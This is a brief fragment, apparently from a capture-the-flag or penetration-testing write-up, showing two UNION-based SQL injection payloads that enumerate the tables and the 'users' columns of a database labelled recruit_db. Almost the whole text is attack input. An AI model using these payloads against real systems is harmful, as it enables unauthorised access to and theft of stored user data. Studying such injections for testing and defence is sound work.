...
bob' UNION SELECT 1,table\_name,3,4 FROM information\_schema.tables WHERE table\_schema=database()-- -
...
bob' UNION SELECT 1,column\_name,3,4 FROM information\_schema.columns WHERE table\_name='users'-- -
...
Database Enumeration (recruit\_db)
